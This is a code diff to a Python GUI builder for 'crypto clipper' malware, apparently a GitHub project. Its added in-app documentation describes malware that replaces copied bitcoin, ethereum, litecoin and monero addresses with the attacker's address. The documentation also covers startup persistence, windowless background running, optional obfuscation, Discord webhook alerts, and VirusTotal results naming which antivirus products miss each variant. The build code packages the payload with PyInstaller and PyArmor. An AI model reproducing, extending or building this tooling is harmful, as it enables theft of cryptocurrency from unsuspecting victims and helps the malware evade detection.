@@ -1,3 +1,7 @@
+"""
+enjoy my spaghetti code
+""" 
+
 from CTkMessagebox import CTkMessagebox
 from PIL import Image
 
@@ -20,6 +24,22 @@ ltc_address_pattern = r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"
 customtkinter.set_appearance_mode("dark")
 
 cwd = os.getcwd()
+
+vtlinksunobf = ["https://www.virustotal.com/gui/file/83d2a5b215563fb2aee128f8a2d12a82d3823ad852bdfd881186a83468e16331?nocache=1",
+                "https://www.virustotal.com/gui/file/e5c06c2948c54fdd7ab48b49a82dc6730cf09d1354651faa02f9ddff157a6960?nocache=1",
+                "https://www.virustotal.com/gui/file/43da94519ff3f8fb56e9da961876bfc73af6bf2c43b840bdcb21e877d67e82cb?nocache=1"]
+
+vtlinksobf = ["https://www.virustotal.com/gui/file/acd7cc709766731e95d145462f51044b65e56281555eb67c4182dacad1b47893?nocache=1",
+              "https://www.virustotal.com/gui/file/966b11d0a0df2ccc965716aa31c9f3e8fd78f2146017ad04d77617474e7a8662?nocache=1",
+              "https://www.virustotal.com/gui/file/f156b552bbb47881c4b92574452cfa7c7b321bd1c3f8269b7c3bbe2748fc6135?nocache=1"]
+
+class virustotal:
+    def open_unobf():
+        for link in vtlinksunobf:
+            webbrowser.open_new_tab(link)
+    def open_obf():
+        for link in vtlinksobf:
+            webbrowser.open_new_tab(link)
 
 class toplevel:
     def agree():
@@ -53,7 +73,7 @@ class toplevel:
         hPyT.maximize_button.disable(root)
         hPyT.opacity.set(root, 0.8)
         hPyT.window_frame.center_relative(root, top_level)
-        
+
         root.bind("<Configure>", lambda event: hPyT.window_frame.center_relative(root, top_level))
 
         text_frame = customtkinter.CTkScrollableFrame(master=top_level)
@@ -100,10 +120,9 @@ class resetconfig:
 
 class build:
     def exe(current_path, new_file_name):
-        print(icon_path)
         if icon_path == "":
             start = time.time()
-            subprocess.run(["pyinstaller", "--onefile", f"{current_path}", "--distpath", "output/dist_non_obfuscated"])
+            subprocess.run(["pyinstaller", "--onefile", "--icon", "DefultIcons/exe.ico", current_path, "--distpath", "output/dist_non_obfuscated"])
             end = time.time()
             final_time = round(end - start)
         else:
@@ -121,7 +140,7 @@ class build:
     def obfuscate(current_path, new_file_name):
         if icon_path == "":
             start = time.time()
-            subprocess.run(["pyarmor", "-d","cfg", "pack:pyi_options", "=", f'" -w"'])
+            subprocess.run(["pyarmor", "-d","cfg", "pack:pyi_options", "=", f'" -w --icon DefultIcons/exe.ico"'])
             time.sleep(1)
             subprocess.run(["pyarmor", "gen", f"{current_path}", "--output=output/dist_obfuscated", "--pack=onefile"])
             end = time.time()
@@ -468,7 +487,7 @@ class buildgui:
         global option_frame, main_frame, root
 
         root = customtkinter.CTk()
-        root.title("clipper builder by 3022-2")
+        root.title("crypto clipper builder")
         root.minsize(width=800, height=400)
         root.geometry("600x400")
         root.resizable(height=False, width=False)
@@ -490,11 +509,48 @@ class buildgui:
 
         docs = customtkinter.CTkScrollableFrame(master=tabview.tab("documentation"), fg_color="#242424")
         docs.pack(fill="both", expand=True)
-        customtkinter.CTkLabel(master=docs, text="""placeholder
-in the event your chosen icon doesnt bind to the .exe try restarting file explorer as for some unknown reason the icon binds but doesnt visually show it until restarting explorer                            
-if issue with icons delete icon cashe %localappdata%.
-                               """, justify="left", wraplength=750).pack(anchor="w")
+        customtkinter.CTkLabel(master=docs, text="""What does this program do?
+This program is a GUI based malware builder. It allows a user to make a customised piece of malware.
 
+What systems can this malware and builder work on?
+The malware and builder will only run on windows computers.
+
+What kind of malware?
+The kind of malware is known as crypto clipper malware. The builder allows you to choose a method (ctypes, subprocess, pyperclip).
+
+How does the malware work?
+Every 0.25 seconds the malware checks to see if the user has copied any text to the clipboard. If the user has then the text in the clipboard is checked to see if its a bitcoin, ethereum, litecoin or monero address. If it is any of these the clipboard is replaced with the hackers crypto address in turn stealing crypto
+
+Is the malware detected by antivirus?
+    All were scanned with virustotal
+
+    subprocess method - obfuscated (detected by 14/74 antivirus software - not detected by windows defender, Yandex, BitDefender, McAfee Scanner, Google)
+    pyperclip method - obfuscated (detected by 7/74 antivirus software - not detected by windows defender, Malwarebytes, Yandex, BitDefender, McAfee Scanner, Google)
+    ctypes method - obfuscated (detected by 12/73 antivirus software - not detected by windows defender, Malwarebytes, Yandex, BitDefender, McAfee Scanner, Google)
+
+    subprocess method - unobfuscated (detected by 14/74 antivirus software - not detected by windows defender, Yandex, BitDefender, McAfee Scanner, Google)
+    pyperclip method - unobfuscated (detected by 7/74 antivirus software - not detected by windows defender, Malwarebytes, Yandex, BitDefender, McAfee Scanner, Google)
+    ctypes method - unobfuscated (detected by 12/74 antivirus software - not detected by windows defender, Malwarebytes, Yandex, BitDefender, McAfee Scanner, Google)
+
+Whats the difference between ctypes, subprocess, pyperclip?
+ctypes - directly interacts with the clipboard to retrieve text and uses powershell to set the new clipboard text - no installs needed meaning anyone with python installed on a windows computer can run it.
+subprocess - uses powershell to retrieve clipboard text and uses powershell to set the new clipboard text - no installs needed meaning anyone with python installed on a windows computer can run it.
+pyperclip - uses the pyperclip package to retrieve and set clipboard text - pyperclip install needed meaning this will only work on windows computers with pyperclip installed through pip install pyperclip.
+
+Features:
+    -Supports bitcoin, ethereum, litecoin, monero
+    -has single use method meaning after one log the code wont run again
+    -duplicates itself to run at startup with a different name
+    -can a add custom icon as .ico file
+    -has an option to obfuscate the .exe but this isnt needed
+    -runs as .pyw file (python windowless) so it runs as background task
+    -if discord webhook added it sends a ping to discord webhook when crypto address detected
+    -creates a readble .pyw as well as the .exe so you can code inspect
+
+My icons arent showing on the .exe, why is this?
+Honestly im not sure why this happens - for some reason the icons bind to the exe but dont visually update. The fix for this is just to restart Windows Explorer in task manager and the icons update. If that didnt work it may be an issue with IconCache.db file in %localappdata% - try deleting this, restarting computer and then it might work.""", justify="left", wraplength=750).pack(anchor="w")
+        customtkinter.CTkButton(master=tabview.tab("documentation"), text="open obfuscated virustotal links", command=lambda: virustotal.open_obf()).pack(fill="x", pady=(5, 0))
+        customtkinter.CTkButton(master=tabview.tab("documentation"), text="open unobfuscated virustotal links", command=lambda: virustotal.open_unobf()).pack(fill="x", pady=(5, 0))
         customtkinter.CTkButton(master=tabview.tab("documentation"), text="https://github.com/3022-2", command=lambda: webbrowser.open_new_tab("https://github.com/3022-2")).pack(fill="x", pady=(5, 0))
 
         buildgui.build_widgets()
@@ -504,12 +560,13 @@ if issue with icons delete icon cashe %localappdata%.
         root.mainloop()
 
 if __name__ == "__main__":
-    if os.path.exists("output\\dist_obfuscated"):
-        pass
-    else:
-        os.mkdir("output\\dist_obfuscated")
-    if os.path.exists("output\\dist_non_obfuscated"):
-        pass
-    else:
-        os.mkdir("output\\dist_non_obfuscated")
-    buildgui.main()
+    if os.name == "nt":
+        if os.path.exists("output\\dist_obfuscated"):
+            pass
+        else:
+            os.mkdir("output\\dist_obfuscated")
+        if os.path.exists("output\\dist_non_obfuscated"):
+            pass
+        else:
+            os.mkdir("output\\dist_non_obfuscated")
+        buildgui.main()
